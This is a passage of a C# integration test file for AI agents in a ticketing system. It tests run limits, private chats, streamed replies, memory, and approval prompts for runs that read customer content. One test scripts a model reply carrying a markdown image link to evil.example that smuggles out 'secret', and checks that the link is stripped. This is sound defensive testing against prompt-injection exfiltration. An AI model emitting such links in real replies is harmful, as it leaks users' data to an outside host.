        AgentItemRef item = (await scope.ServiceProvider.GetServices<IAgentItemKind>().First(k => k.Kind == "ticket").FindAsync(ticket, default))!;
        AgentStartResult started = await scope.ServiceProvider.GetRequiredService<AgentRunService>()
            .StartAsync(new AgentStart(Guid.Parse(agent), "ticket", item.Id, AgentTriggers.Schedule, null, "Nightly", "night:always"), default);

        // The admin who made it is its responsible person and may change its settings: "always" sets the tool to run.
        await WaitingAsync(await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin));
        JsonElement question = (await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin)).GetProperty("question");
        Assert.True(question.GetProperty("canAlways").GetBoolean());
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{question.GetProperty("id").GetString()}/answer", Admin, new { answer = "always" });
        await FinishedAsync(await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin));
        using IServiceScope after = _factory!.Services.CreateScope();
        Agent saved = await after.ServiceProvider.GetRequiredService<AgentsDb>().RunAsync(db => db.Agents.AsNoTracking().FirstAsync(a => a.Id == Guid.Parse(agent)));
        Assert.Equal(AgentToolSettings.Run, saved.Tools["set_priority"]);
        Assert.Equal(0, (await SendAsync(HttpMethod.Get, "/api/me/agent-permissions", Admin)).GetArrayLength());
    }

    [Fact]
    public async Task A_days_caps_stop_an_agents_runs_and_one_outside_senders()
    {
        Limits(o => (o.MaxRunsPerAgentPerDay, o.MaxRunsPerSenderPerDay) = (3, 1));
        string agent = await SetUpAgentAsync("capped", "demo-answer: Seen.");
        string ticket = await TicketAsync(Ben, "DESK", "Many asks");
        using IServiceScope scope = _factory!.Services.CreateScope();
        AgentRunService runs = scope.ServiceProvider.GetRequiredService<AgentRunService>();
        AgentItemRef item = (await scope.ServiceProvider.GetServices<IAgentItemKind>().First(k => k.Kind == "ticket").FindAsync(ticket, default))!;
        AgentStart Start(string cause, Guid? sender = null) =>
            new(Guid.Parse(agent), "ticket", item.Id, AgentTriggers.Mentioned, null, "Look", cause) { ActorId = Guid.Parse(Ben), Sender = sender };

        // One sender from outside the team starts one run a day here; the next is refused.
        Guid sender = Guid.Parse(Cy);
        Assert.NotNull((await runs.StartAsync(Start("a", sender), default)).RunId);
        AgentStartResult second = await runs.StartAsync(Start("b", sender), default);
        Assert.Null(second.RunId);
        Assert.Contains("a sender may start in a day", second.Why);

        // The agent starts three a day in all; the fourth is refused, whoever starts it.
        Assert.NotNull((await runs.StartAsync(Start("c"), default)).RunId);
        Assert.NotNull((await runs.StartAsync(Start("d"), default)).RunId);
        AgentStartResult fourth = await runs.StartAsync(Start("e"), default);
        Assert.Null(fourth.RunId);
        Assert.Contains("runs it may start in a day", fourth.Why);
    }

    [Fact]
    public async Task A_chat_is_its_persons_own_carries_what_was_said_and_keeps_its_replies_until_they_post_one()
    {
        // Chats: each message is a run with the person's rights that gets the chat so far ($turn: which message it answers).
        string agent = await SetUpAgentAsync("chatty", """
            demo: get_ticket {"key":"$ticket"}
            demo-answer: Reply $turn.
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Printer on fire");

        JsonElement places = await SendAsync(HttpMethod.Get, "/api/agent-chats/places", Ben);
        Assert.Contains(places.EnumerateArray(), p => p.GetProperty("scope").GetProperty("key").GetString() == "DESK"
            && p.GetProperty("agents").EnumerateArray().Any(a => a.GetProperty("id").GetString() == agent));

        JsonElement chat = await SendAsync(HttpMethod.Post, "/api/agent-chats", Ben, new { agentId = agent, ticket, prompt = "What's this about?" });
        string id = chat.GetProperty("chat").GetProperty("id").GetString()!;
        Assert.Equal(ticket, chat.GetProperty("chat").GetProperty("itemKey").GetString());
        JsonElement first = await FinishedAsync(chat.GetProperty("runs")[0]);
        Assert.Equal("chat", first.GetProperty("trigger").GetString());
        Assert.Equal("What's this about?", first.GetProperty("prompt").GetString());
        Assert.Equal("Reply 1.", first.GetProperty("answer").GetString());

        // The next message's run gets the first exchange: it answers the second message.
        JsonElement said = await SendAsync(HttpMethod.Post, $"/api/agent-chats/{id}/messages", Ben, new { prompt = "And now?" });
        JsonElement second = await FinishedAsync(said.GetProperty("runs")[1]);
        Assert.Equal("Reply 2.", second.GetProperty("answer").GetString());

        // Private: nothing went on the ticket, Cy can't open the chat, sees neither reply, and the ticket's runs leave out
        // the chat's runs, which changed nothing there.
        Assert.Equal(0, (await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben)).GetProperty("notes").GetArrayLength());
        Assert.Equal(System.Net.HttpStatusCode.NotFound, (await RawAsync(HttpMethod.Get, $"/api/agent-chats/{id}", Cy)).StatusCode);
        Assert.Equal(JsonValueKind.Null, (await SendAsync(HttpMethod.Get, $"/api/agent-runs/{second.GetProperty("id").GetString()}", Cy)).GetProperty("answer").ValueKind);
        Assert.Equal(0, (await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}/agent-runs", Cy)).GetArrayLength());
        Assert.Equal(0, (await SendAsync(HttpMethod.Get, "/api/agent-chats", Cy)).GetArrayLength());
        JsonElement mine = await SendAsync(HttpMethod.Get, "/api/agent-chats", Ben);
        Assert.Equal("What's this about?", mine[0].GetProperty("title").GetString());

        // Ben posts the second reply, once: a note by Ben, run by the agent, in that run's change set.
        JsonElement now = await SendAsync(HttpMethod.Get, $"/api/agent-chats/{id}", Ben);
        Assert.Equal(2, now.GetProperty("postable").GetArrayLength());
        JsonElement posted = await SendAsync(HttpMethod.Post, $"/api/agent-chats/{id}/runs/{second.GetProperty("id").GetString()}/post", Ben);
        Assert.Equal(1, posted.GetProperty("postable").GetArrayLength());
        JsonElement note = (await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben)).GetProperty("notes")[0];
        Assert.Equal("Reply 2.", note.GetProperty("body").GetString());
        Assert.Equal(second.GetProperty("agent").GetProperty("id").GetString(), note.GetProperty("actingAccountId").GetString());
        Assert.Equal(second.GetProperty("changeSetId").GetString(), note.GetProperty("changeSetId").GetString());
        Assert.Equal(System.Net.HttpStatusCode.Conflict,
            (await RawAsync(HttpMethod.Post, $"/api/agent-chats/{id}/runs/{second.GetProperty("id").GetString()}/post", Ben)).StatusCode);

        // Deleting it: gone from the list; its runs keep who and each step's outcome, not what was said.
        Assert.True((await RawAsync(HttpMethod.Delete, $"/api/agent-chats/{id}", Ben)).IsSuccessStatusCode);
        Assert.Equal(System.Net.HttpStatusCode.NotFound, (await RawAsync(HttpMethod.Get, $"/api/agent-chats/{id}", Ben)).StatusCode);
        JsonElement forgotten = await SendAsync(HttpMethod.Get, $"/api/agent-runs/{first.GetProperty("id").GetString()}", Ben);
        Assert.Equal("", forgotten.GetProperty("prompt").GetString());
        Assert.Equal(JsonValueKind.Null, forgotten.GetProperty("answer").ValueKind);
        Assert.Equal(["get_ticket:done"], Tools(forgotten));
        Assert.Null(ToolSteps(forgotten)[0].GetProperty("output").GetString());
    }

    [Fact]
    public async Task A_chat_shows_its_reply_as_it_is_written_a_block_at_a_time_cleaned_and_a_reader_that_drops_picks_up_where_it_left_off()
    {
        // The model writes seven characters every tenth of a second, after one tool call; its reply has an image from elsewhere.
        string agent = await SetUpAgentAsync("writer", """
            demo: get_ticket {"key":"$ticket"}
            demo-slow: 100
            demo-answer: First paragraph.\n\n![leak](https://evil.example/x?d=secret)\n\nLast paragraph, a little longer than the others.
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Streamed");
        JsonElement chat = await SendAsync(HttpMethod.Post, "/api/agent-chats", Ben, new { agentId = agent, ticket, prompt = "Tell me" });
        string id = chat.GetProperty("chat").GetProperty("id").GetString()!;
        Assert.Equal(System.Net.HttpStatusCode.NotFound, (await RawAsync(HttpMethod.Get, $"/api/agent-chats/{id}/events", Cy)).StatusCode);

        string? stateAtFirstText = null;
        List<(long Id, string Type, JsonElement Data)> events = await ChatEventsAsync(id, Ben, seen: async type =>
        {
            if (type == "text" && stateAtFirstText is null)
            {
                stateAtFirstText = (await SendAsync(HttpMethod.Get, $"/api/agent-chats/{id}", Ben)).GetProperty("runs")[0].GetProperty("state").GetString();
            }
        });

        // The first words showed while the model was still writing; then each step as it went, and the run's end.
        Assert.Equal("running", stateAtFirstText);
        Assert.Equal(events.Select(e => e.Id).Order(), events.Select(e => e.Id));
        Assert.Equal(["turn", "step", "step", "turn"], events.Take(4).Select(e => e.Type));
        Assert.Equal(["get_ticket", "get_ticket"], events.Where(e => e.Type == "step").Select(e => e.Data.GetProperty("tool").GetString()));
        Assert.Equal(["done"], events.Where(e => e.Type == "step").Skip(1).Select(e => e.Data.GetProperty("outcome").GetString()));
        Assert.Equal("run", events[^1].Type);
        Assert.Equal("done", events[^1].Data.GetProperty("state").GetString());

        // A block at a time, each cleaned before it was sent: joined, they're the reply the chat keeps.
        List<string> texts = [.. events.Where(e => e.Type == "text").Select(e => e.Data.GetProperty("text").GetString()!)];
        Assert.True(texts.Count >= 3);
        Assert.DoesNotContain(texts, t => t.Contains("![leak](", StringComparison.Ordinal));
        JsonElement kept = (await SendAsync(HttpMethod.Get, $"/api/agent-chats/{id}", Ben)).GetProperty("runs")[0];
        Assert.Equal(kept.GetProperty("answer").GetString(), string.Concat(texts));

        // A reader that dropped after the first text gets the rest, from there.
        long first = events.First(e => e.Type == "text").Id;
        List<(long Id, string Type, JsonElement Data)> rest = await ChatEventsAsync(id, Ben, after: first);
        Assert.Equal(events.Where(e => e.Id > first).Select(e => e.Id), rest.Select(e => e.Id));

        // The next message starts afresh: the chat's earlier events go.
        JsonElement next = await SendAsync(HttpMethod.Post, $"/api/agent-chats/{id}/messages", Ben, new { prompt = "Again" });
        await FinishedAsync(next.GetProperty("runs")[next.GetProperty("runs").GetArrayLength() - 1]);
        List<(long Id, string Type, JsonElement Data)> again = await ChatEventsAsync(id, Ben);
        Assert.True(again.Count > 0 && again.All(e => e.Id > events[^1].Id));
    }

    [Fact]
    public async Task A_model_that_throws_or_a_reply_that_breaks_off_ends_the_run_with_the_error_and_keeps_no_answer()
    {
        string thrower = await SetUpAgentAsync("thrower", "demo-throw\ndemo-answer: Never.");
        JsonElement chat = await SendAsync(HttpMethod.Post, "/api/agent-chats", Ben, new { agentId = thrower, desk = "DESK", prompt = "Go" });
        JsonElement run = await FinishedAsync(chat.GetProperty("runs")[0]);
        Assert.Equal("failed", run.GetProperty("state").GetString());
        Assert.Contains("its call failed (InvalidOperationException)", run.GetProperty("error").GetString(), StringComparison.Ordinal);
        Assert.Equal(JsonValueKind.Null, run.GetProperty("answer").ValueKind);

        // Text came before the break, but the reply isn't kept: the run's end says why, and the reader sees it end.
        string breaker = await SetUpAgentAsync("breaker", "demo-break: 21\ndemo-answer: A long answer that is cut off well before its end.");
        chat = await SendAsync(HttpMethod.Post, "/api/agent-chats", Ben, new { agentId = breaker, desk = "DESK", prompt = "Go" });
        run = await FinishedAsync(chat.GetProperty("runs")[0]);
        Assert.Equal("failed", run.GetProperty("state").GetString());
        Assert.Equal("The model's reply broke off: The sample's model was cut off.", run.GetProperty("error").GetString());
        Assert.Equal(JsonValueKind.Null, run.GetProperty("answer").ValueKind);
        List<(long Id, string Type, JsonElement Data)> events = await ChatEventsAsync(chat.GetProperty("chat").GetProperty("id").GetString()!, Ben);
        Assert.Equal("failed", events[^1].Data.GetProperty("state").GetString());
        Assert.Equal(run.GetProperty("error").GetString(), events[^1].Data.GetProperty("error").GetString());
    }

    [Fact]
    public async Task A_chats_next_run_starts_marked_as_its_earlier_ones_and_waits_for_the_last_to_end()
    {
        // A chat about Ben's own ticket. The first message's run reads a customer's ticket; the second's reads only Ben's
        // own. It still asks before its change, which its settings let run: it got what the first one said.
        string customers = await TicketAsync(Ben, "DESK", "Please help", fromCustomer: true);
        string own = await TicketAsync(Ben, "DESK", "Ours");
        Assert.Equal(("DESK-1", "DESK-2"), (customers, own));
        string agent = await SetUpAgentAsync("carrier", """
            demo: get_ticket {"key":"DESK-$turn"}
            demo: set_priority {"key":"DESK-2","priority":"high"}
            demo-answer: Read $turn.
            """);

        JsonElement chat = await SendAsync(HttpMethod.Post, "/api/agent-chats", Ben, new { agentId = agent, ticket = own, prompt = "Look at the first" });
        string id = chat.GetProperty("chat").GetProperty("id").GetString()!;
        JsonElement first = await WaitingAsync(chat.GetProperty("runs")[0]);
        Assert.True(first.GetProperty("outside").GetBoolean());
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{first.GetProperty("question").GetProperty("id").GetString()}/answer", Ben, new { answer = "refuse" });
        await FinishedAsync(first);

        JsonElement said = await SendAsync(HttpMethod.Post, $"/api/agent-chats/{id}/messages", Ben, new { prompt = "Now the second" });
        JsonElement second = await WaitingAsync(said.GetProperty("runs")[1]);
        Assert.Equal("waiting", second.GetProperty("state").GetString());
        Assert.True(second.GetProperty("outside").GetBoolean());
        Assert.True(Tools(second) is ["get_ticket:done", "set_priority:asked"], second.ToString());

        // While it waits, the chat takes no message and can't be deleted.
        Assert.Equal(System.Net.HttpStatusCode.Conflict, (await RawAsync(HttpMethod.Post, $"/api/agent-chats/{id}/messages", Ben, new { prompt = "Hurry" })).StatusCode);
        Assert.Equal(System.Net.HttpStatusCode.Conflict, (await RawAsync(HttpMethod.Delete, $"/api/agent-chats/{id}", Ben)).StatusCode);
        Assert.False((await SendAsync(HttpMethod.Get, $"/api/agent-chats/{id}", Ben)).GetProperty("canSend").GetBoolean());

        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{second.GetProperty("question").GetProperty("id").GetString()}/answer", Ben, new { answer = "allow" });
        JsonElement done = await FinishedAsync(second);
        Assert.Equal("Read 2.", done.GetProperty("answer").GetString());
        Assert.Equal("high", (await SendAsync(HttpMethod.Get, $"/api/tickets/{own}", Ben)).GetProperty("priority").GetString());
        // The second run changed the ticket, so the ticket's runs show it to Cy, without what was said; the first changed
        // nothing and stays out.
        JsonElement listed = (await SendAsync(HttpMethod.Get, $"/api/tickets/{own}/agent-runs", Cy)).EnumerateArray().Single();
        Assert.Equal(done.GetProperty("id").GetString(), listed.GetProperty("id").GetString());
        Assert.Equal(JsonValueKind.Null, listed.GetProperty("answer").ValueKind);
        Assert.Equal(JsonValueKind.Null, listed.GetProperty("prompt").ValueKind);

        // A chat in the desk, about no ticket, has nowhere to post its replies.
        JsonElement desk = await SendAsync(HttpMethod.Post, "/api/agent-chats", Ben, new { agentId = agent, desk = "DESK", prompt = "Anything new?" });
        Assert.Equal(JsonValueKind.Null, desk.GetProperty("chat").GetProperty("itemKey").ValueKind);
        await WaitingAsync(desk.GetProperty("runs")[0]);
        await SendAsync(HttpMethod.Post, $"/api/agent-runs/{desk.GetProperty("runs")[0].GetProperty("id").GetString()}/stop", Ben);
        JsonElement stopped = await SendAsync(HttpMethod.Get, $"/api/agent-chats/{desk.GetProperty("chat").GetProperty("id").GetString()}", Ben);
        Assert.Equal("stopped", stopped.GetProperty("runs")[0].GetProperty("state").GetString());
        Assert.Equal(0, stopped.GetProperty("postable").GetArrayLength());
        Assert.True(stopped.GetProperty("canSend").GetBoolean());
    }

    [Fact]
    public async Task An_agents_own_limits_and_failures_in_a_row_end_its_runs_and_a_person_has_only_so_many_going()
    {
        // Limits: the site lets two failures in a row, and one run going per person.
        Limits(o => (o.MaxToolFailuresInRow, o.MaxWaitingPerPerson) = (2, 1));

        // Its own limit of one turn: a two-call script stops after the first.
        string brief = await SetUpAgentAsync("brief", """
            demo: get_ticket {"key":"$ticket"}
            demo: get_ticket {"key":"$ticket"}
            demo-answer: Done.
            """);
        JsonElement limited = await SendAsync(HttpMethod.Put, $"/api/agents/{brief}", Admin, new { limits = new { maxTurns = 1 } });
        Assert.Equal(1, limited.GetProperty("limits").GetProperty("maxTurns").GetInt32());
        Assert.Equal(30, limited.GetProperty("siteLimits").GetProperty("maxTurns").GetInt32());
        string ticket = await TicketAsync(Ben, "DESK", "Short");
        JsonElement run = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = brief, prompt = "Go" }));
        Assert.Equal("failed", run.GetProperty("state").GetString());
        Assert.Contains("1 turns", run.GetProperty("error").GetString());
        Assert.Equal(["get_ticket:done"], Tools(run));

        // Two failed calls in a row stop the run before a third.
        string clumsy = await SetUpAgentAsync("clumsy", """
            demo: get_ticket {"key":"DESK-404"}
            demo: get_ticket {"key":"DESK-405"}
            demo: get_ticket {"key":"DESK-406"}
            demo-answer: Done.
            """);
        JsonElement failing = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = clumsy, prompt = "Go" }));
        Assert.Equal("failed", failing.GetProperty("state").GetString());
        Assert.Contains("last 2 tool calls failed", failing.GetProperty("error").GetString());
        Assert.Equal(["get_ticket:failed", "get_ticket:failed"], Tools(failing));

        // A run of Ben's waits for his answer, so his next one isn't started.
        string asker = await SetUpAgentAsync("asker", """
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo-answer: Done.
            """, new { add_note = "run" });
        JsonElement waiting = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = asker, prompt = "Raise it" }));
        Assert.Equal("waiting", waiting.GetProperty("state").GetString());
        HttpResponseMessage refused = await RawAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = brief, prompt = "Again" });
        Assert.False(refused.IsSuccessStatusCode);
        Assert.Contains("runs that haven't ended", await refused.Content.ReadAsStringAsync());
        // Cy's own allowance is untouched.
        Assert.True((await RawAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Cy, new { agentId = brief, prompt = "Mine" })).IsSuccessStatusCode);
    }

    [Fact]
    public async Task An_agent_remembers_about_a_ticket_is_given_it_next_time_recalls_it_and_keeps_none_after_reading_beyond_its_desk()
    {
        // Memories: a memory about a ticket, kept in one run, given to the next run on it and found by recall.
        string agent = await SetUpAgentAsync("noter", """
            demo: remember {"text":"The printer jams when the tray is overfilled."}
            demo-answer: Kept. Memories given: $memories.
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Printer jams");
        JsonElement first = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Note it" }));
        Assert.Equal(["remember:done"], Tools(first));
        Assert.Equal("Kept. Memories given: no.", first.GetProperty("answer").GetString());

        await SendAsync(HttpMethod.Put, $"/api/agents/{agent}", Admin, new { instructions = """
            demo: recall {"query":"printer tray"}
            demo-answer: Recalled. Memories given: $memories.
            """ });
        JsonElement second = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Cy, new { agentId = agent, prompt = "Look" }));
        Assert.Equal("Recalled. Memories given: yes.", second.GetProperty("answer").GetString());
        // Cy started it, so Cy reads its steps.
        JsonElement cys = await SendAsync(HttpMethod.Get, $"/api/agent-runs/{second.GetProperty("id").GetString()}", Cy);
        string recalled = ToolSteps(cys)[0].GetProperty("output").GetString()!;
        Assert.Contains("The printer jams when the tray is overfilled.", recalled);
        Assert.Contains($"\"about\":\"{ticket}\"", recalled);
        Assert.False(second.GetProperty("outside").GetBoolean());

        // Off: the tools aren't offered, and nothing is given.
        await SendAsync(HttpMethod.Put, $"/api/agents/{agent}", Admin, new { memory = false });
        JsonElement off = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Look" }));
        Assert.Equal(["recall:refused"], Tools(off));
        Assert.Equal("Recalled. Memories given: no.", off.GetProperty("answer").GetString());
        await SendAsync(HttpMethod.Put, $"/api/agents/{agent}", Admin, new { memory = true });

        // A memory about another desk's ticket isn't kept; nor is any after a read beyond the desk.
        string elsewhere = await TicketAsync(Ben, "OPS", "Elsewhere");
        await SendAsync(HttpMethod.Put, $"/api/agents/{agent}", Admin, new { instructions = $$"""
            demo: remember {"text":"Ops has a spare printer.","about":"{{elsewhere}}"}
            demo: list_desks {}
            demo: remember {"text":"Every desk has a printer."}
            demo-answer: Done.
            """ });
        JsonElement wide = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Look around" }));
        Assert.True(Tools(wide) is ["remember:failed", "list_desks:done", "remember:failed"], wide.ToString());
        List<JsonElement> steps = ToolSteps(wide);
        Assert.Contains("isn't one you may keep memories about here", steps[0].GetProperty("output").GetString());
        Assert.Contains("read beyond its scope", steps[2].GetProperty("output").GetString());
    }

    [Fact]
    public async Task A_memory_kept_after_outside_content_marks_the_run_it_reaches()
    {
        // Kept in a run on a customer's ticket, it's marked outside; a run on Ben's own ticket that recalls it is marked so
        // too, and then its change asks, though its settings let it run.
        string agent = await SetUpAgentAsync("careful-noter", """
            demo: remember {"text":"The customer wants a call back."}
            demo-answer: Kept.
            """);
        string customers = await TicketAsync(Ben, "DESK", "Please call", fromCustomer: true);
        JsonElement kept = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{customers}/agent-runs", Ben, new { agentId = agent, prompt = "Note it" }));
        Assert.Equal(["remember:done"], Tools(kept));

        string own = await TicketAsync(Ben, "DESK", "Ours");
        await SendAsync(HttpMethod.Put, $"/api/agents/{agent}", Admin, new { instructions = """
            demo: recall {"query":"customer call"}
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo-answer: Done.
            """ });
        JsonElement asked = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{own}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        Assert.True(asked.GetProperty("outside").GetBoolean());
        Assert.True(Tools(asked) is ["recall:done", "set_priority:asked"], asked.ToString());
    }

    private static List<JsonElement> ToolSteps(JsonElement run) =>
        [.. run.GetProperty("steps").EnumerateArray().Where(s => s.GetProperty("kind").GetString() == "tool")];

    /// <summary>This test's host, with other agents' limits; set before its first request.</summary>
    private void Limits(Action<AgentsOptions> limits) =>
        _factory = _root!.WithWebHostBuilder(host => host.ConfigureServices(services => services.PostConfigure(limits)));

    /// <summary>Agents on, then a site agent offered to every desk, with these instructions and tools, taken on by DESK.</summary>
    private async Task<string> SetUpAgentAsync(string key, string instructions, object? tools = null)
    {
        await SendAsync(HttpMethod.Put, "/api/agents/settings", Admin, new { enabled = true });
        JsonElement agent = await SendAsync(HttpMethod.Post, "/api/agents", Admin, new
        {
            key, offerAll = true, instructions,
            tools = tools ?? new { set_priority = "run", add_note = "run" },
        });
        string id = agent.GetProperty("id").GetString()!;
        Assert.Equal("agent", agent.GetProperty("account").GetProperty("kind").GetString());
        await SendAsync(HttpMethod.Put, $"/api/desks/DESK/agents/{id}/take", Admin, new { roleKey = "helper" });
        return id;
    }

    private async Task<string> TicketAsync(string who, string desk, string title, bool fromCustomer = false) =>
        (await SendAsync(HttpMethod.Post, "/api/tickets", who, new { desk, title, body = "Details", fromCustomer })).GetProperty("key").GetString()!;

    /// <summary>The run once it waits for an answer (or, if it doesn't ask, has ended).</summary>
    private async Task<JsonElement> WaitingAsync(JsonElement run)
    {
        string id = run.GetProperty("id").GetString()!;
        for (int i = 0; i < 150; i++)
        {
            JsonElement now = await SendAsync(HttpMethod.Get, $"/api/agent-runs/{id}", Ben);
            if (now.GetProperty("state").GetString() is "waiting" or "done" or "failed" or "stopped")
            {
                return now;
            }

            await Task.Delay(200);
        }

        throw new TimeoutException($"The run {id} didn't ask.");
    }

    /// <summary>The run once the package's worker has worked it to its end.</summary>
    private async Task<JsonElement> FinishedAsync(JsonElement run)
    {
        string id = run.GetProperty("id").GetString()!;
        for (int i = 0; i < 150; i++)
        {
            JsonElement now = await SendAsync(HttpMethod.Get, $"/api/agent-runs/{id}", Ben);
            if (now.GetProperty("state").GetString() is "done" or "failed" or "stopped")
            {
                return now;
            }

            await Task.Delay(200);
        }

        throw new TimeoutException($"The run {id} didn't finish.");
    }

    private static List<string> Tools(JsonElement run) =>
        [.. run.GetProperty("steps").EnumerateArray().Where(s => s.GetProperty("kind").GetString() == "tool")
            .Select(s => $"{s.GetProperty("name").GetString()}:{s.GetProperty("outcome").GetString()}")];

    /// <summary>A chat's events as its reader gets them, until the stream ends; each one's type handed to <paramref name="seen"/> as it comes.</summary>
    private async Task<List<(long Id, string Type, JsonElement Data)>> ChatEventsAsync(string chat, string account, long? after = null,
        Func<string, Task>? seen = null)
    {
        using HttpRequestMessage request = new(HttpMethod.Get, $"/api/agent-chats/{chat}/events");
        request.Headers.Add("X-Account", account);
        if (after is { } last)
        {
            request.Headers.Add("Last-Event-ID", last.ToString(System.Globalization.CultureInfo.InvariantCulture));
        }

        using HttpResponseMessage response = await _factory!.CreateClient().SendAsync(request, HttpCompletionOption.ResponseHeadersRead);
        Assert.True(response.IsSuccessStatusCode, $"events: {(int)response.StatusCode}");
        using StreamReader reader = new(await response.Content.ReadAsStreamAsync());
        List<(long Id, string Type, JsonElement Data)> events = [];
        (long id, string type, System.Text.StringBuilder data) = (0, "message", new System.Text.StringBuilder());
        while (await reader.ReadLineAsync() is { } line)
        {
            if (line.Length == 0)
            {
                if (data.Length > 0 && type != "ping")
                {
                    using JsonDocument document = JsonDocument.Parse(data.ToString());
                    events.Add((id, type, document.RootElement.Clone()));
                    if (seen is not null)
                    {
                        await seen(type);
                    }
                }

                (id, type) = (0, "message");
                data.Clear();
            }
            else if (line.StartsWith("id:", StringComparison.Ordinal))
            {
                id = long.Parse(line[3..].Trim(), System.Globalization.CultureInfo.InvariantCulture);
            }
            else if (line.StartsWith("event:", StringComparison.Ordinal))
            {
                type = line[6..].Trim();
            }
            else if (line.StartsWith("data:", StringComparison.Ordinal))
            {
                data.Append(line[5..].TrimStart());
            }
        }

        return events;
    }

    private async Task<HttpResponseMessage> RawAsync(HttpMethod method, string path, string account, object? body = null)
    {
        using HttpRequestMessage request = new(method, path);
        request.Headers.Add("X-Account", account);
        if (body is not null)
        {
            request.Content = JsonContent.Create(body);
        }

        return await _factory!.CreateClient().SendAsync(request);
    }

    private async Task<JsonElement> SendAsync(HttpMethod method, string path, string account, object? body = null)
    {
        HttpResponseMessage response = await RawAsync(method, path, account, body);
        string text = await response.Content.ReadAsStringAsync();
        Assert.True(response.IsSuccessStatusCode, $"{method} {path}: {(int)response.StatusCode} {text}");
        return text.Length == 0 ? default : JsonDocument.Parse(text).RootElement.Clone();
    }
}
